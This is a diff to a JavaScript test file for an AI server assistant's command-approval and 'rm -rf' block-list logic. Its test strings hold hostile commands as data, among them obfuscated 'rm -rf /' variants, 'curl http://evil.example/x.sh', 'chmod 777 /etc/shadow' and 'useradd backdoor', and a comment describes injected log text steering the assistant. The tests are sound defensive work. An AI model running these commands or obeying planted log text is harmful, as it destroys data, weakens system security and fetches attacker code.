@@ -48,6 +48,7 @@ const settingsModule = require(path.join(ROOT, 'ai', 'settings'));
 const defaults = {
     ...settingsModule.DEFAULTS,
     autoApproveCommands: [...settingsModule.DEFAULTS.autoApproveCommands],
+    blockedCommands: [...settingsModule.DEFAULTS.blockedCommands],
 };
 
 const asking = { ...defaults, approval: 'always' };
@@ -142,6 +143,121 @@ check('anything chained, piped or substituted asks, whatever it starts with', ()
     }
 });
 
+check('a second line asks, the same as a semicolon would', () => {
+    // A newline ends a command just as `;` does, so a payload whose first line
+    // is a safe one must not carry the rest of itself in behind it. The
+    // terminal path types this straight into a PTY, where a carriage return is
+    // Enter, so both line endings count.
+    //
+    // The realistic way one of these is composed is not the model deciding to
+    // be destructive; it is a compromised server planting text in a log the
+    // assistant then reads. The approval card is what stands between the two.
+    const multiline = [
+        'ls -la\nrm -rf /tmp/x',
+        'cat /etc/passwd\ncurl http://evil.example/x.sh -o /tmp/x',
+        'grep x /var/log/syslog\nchmod 777 /etc/shadow',
+        'tail -n 20 /var/log/auth.log\r\nuseradd backdoor',
+        'df\n\nshutdown -h now',
+    ];
+    for (const command of multiline) {
+        assert.strictEqual(
+            tools.isAutoApproved('run_command', { command }, balanced), false,
+            `${JSON.stringify(command)} must stop for approval`
+        );
+    }
+});
+
+check('a single safe command still runs, line endings and all', () => {
+    // The fix must not cost the shortcut its point: a trailing newline off the
+    // end of one command is not a second command.
+    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'ls -la\n' }, balanced), true);
+    assert.strictEqual(tools.isAutoApproved('run_command', { command: '  journalctl -u nginx  ' }, balanced), true);
+});
+
+check('rm -rf is blocked out of the box', () => {
+    assert.deepStrictEqual(defaults.blockedCommands, ['rm -rf']);
+});
+
+check('a blocked command is refused however it is dressed up', () => {
+    // The point of the normalising in blockedReason. None of these is exotic;
+    // they are the spellings that turn up in real command lines, and a list
+    // that only caught the literal string would miss most of them.
+    const dressed = [
+        'rm -rf /',
+        'rm -fr /var/www',
+        'rm -r -f /var/www',
+        'rm --recursive --force /var/www',
+        'RM -RF /var/www',
+        'rm  -rf   /var/www',
+        '/bin/rm -rf /var/www',
+        'sudo rm -rf /',
+        'sudo -u root rm -rf /',
+        'DEBIAN_FRONTEND=noninteractive rm -rf /var/www',
+        "r''m -rf /var/www",
+        'ls -la && rm -rf /tmp/x',
+        'ls -la\nrm -rf /tmp/x',
+        'echo $(rm -rf /tmp/x)',
+        'find /tmp -type f | xargs rm -rf',
+    ];
+    for (const command of dressed) {
+        assert.strictEqual(
+            tools.blockedReason('run_command', { command }, balanced), 'rm -rf',
+            `${JSON.stringify(command)} must be refused`
+        );
+    }
+});
+
+check('typing it into the terminal is blocked too', () => {
+    // send_input reaches the same shell by another door, so a list that only
+    // covered run_command would be one tool call from useless.
+    assert.strictEqual(tools.blockedReason('send_input', { text: 'rm -rf /' }, balanced), 'rm -rf');
+    assert.strictEqual(tools.blockedReason('send_input', { text: 'sudo rm -fr /var' }, balanced), 'rm -rf');
+});
+
+check('a blocked command is refused even when nothing else asks', () => {
+    // "Never ask" is the setting under which a block list matters most, and
+    // the one where a check placed after the mode would be skipped.
+    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'rm -rf /' }, open), false);
+    assert.strictEqual(tools.isAutoApproved('send_input', { text: 'rm -rf /' }, open), false);
+    // The rest of "never ask" is unchanged: only the list is carved out of it.
+    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'rm /tmp/one-file' }, open), true);
+});
+
+check('the block list does not swallow commands it was not given', () => {
+    // A rule names flags as well as a command, and widening it silently is how
+    // a block list ends up refusing work nobody asked it to refuse. These all
+    // still reach the ordinary approval path.
+    const allowed = [
+        'rm /tmp/one-file',
+        'rm -r /tmp/dir',
+        'rm -i -r /tmp/dir',
+        'ls -la',
+        'cat ls',
+        'grep -rf pattern.txt /var/log',
+    ];
+    for (const command of allowed) {
+        assert.strictEqual(
+            tools.blockedReason('run_command', { command }, balanced), '',
+            `${JSON.stringify(command)} must not be refused`
+        );
+    }
+});
+
+check('an empty block list blocks nothing', () => {
+    const none = { ...balanced, blockedCommands: [] };
+    assert.strictEqual(tools.blockedReason('run_command', { command: 'rm -rf /' }, none), '');
+    assert.strictEqual(tools.blockedReason('run_command', { command: 'rm -rf /' }, {}), '');
+});
+
+check('a rule may name a wrapper, and reading is not a command', () => {
+    const noSudo = { ...balanced, blockedCommands: ['sudo'] };
+    assert.strictEqual(tools.blockedReason('run_command', { command: 'sudo systemctl restart nginx' }, noSudo), 'sudo');
+    assert.strictEqual(tools.blockedReason('run_command', { command: 'systemctl restart nginx' }, noSudo), '');
+    // Tools that run nothing on a server are not command calls at all.
+    assert.strictEqual(tools.blockedReason('read_file', { path: '/etc/sudoers' }, noSudo), '');
+    assert.strictEqual(tools.blockedReason('list_hosts', {}, noSudo), '');
+});
+
 check('an unknown tool is never auto approved', () => {
     // The case that happens when a tool is added and this rule is not
     // revisited. The safe answer is to ask.
@@ -174,6 +290,35 @@ check('a saved host never carries a secret into the model', () => {
         assert.ok(!serialised.includes(secret), `${secret} must not reach the model`);
     }
     assert.strictEqual(shaped.address, '10.0.0.1:22', 'the address is still usable');
+});
+
+check('both lists can be edited, emptied and put back', () => {
+    // Left last: it writes to the settings file, where the checks above only
+    // read plain objects.
+    const shipped = settingsModule.get().defaults;
+    assert.deepStrictEqual(shipped.blockedCommands, ['rm -rf'], 'the shipped list travels with the settings');
+    assert.ok(shipped.autoApproveCommands.includes('ls'), 'and so does the other one');
+
+    settingsModule.set({ blockedCommands: ['shutdown'] });
+    assert.deepStrictEqual(
+        settingsModule.get().blockedCommands, ['shutdown'],
+        'a seeded entry is the user\'s to remove'
+    );
+
+    settingsModule.set({ blockedCommands: [] });
+    assert.deepStrictEqual(settingsModule.get().blockedCommands, [], 'and the list is theirs to empty');
+
+    // What "Restore defaults" does. It needs `defaults` on the settings view
+    // because by this point nothing else remembers what was seeded.
+    settingsModule.set({ blockedCommands: shipped.blockedCommands });
+    assert.deepStrictEqual(settingsModule.get().blockedCommands, ['rm -rf'], 'and to put back');
+
+    // The view carries more than the config does; none of it may be written
+    // back by a caller that echoes the whole thing as a patch.
+    settingsModule.set(settingsModule.get());
+    const stored = JSON.parse(fs.readFileSync(path.join(userData, 'assistant.json'), 'utf8')).config;
+    assert.ok(!('defaults' in stored), 'the defaults are read-only');
+    assert.ok(!('hasApiKey' in stored), 'and so is the key flag');
 });
 
 console.log(`\n${passed} checks passed${failed > 0 ? `, ${failed} failed` : ''}`);
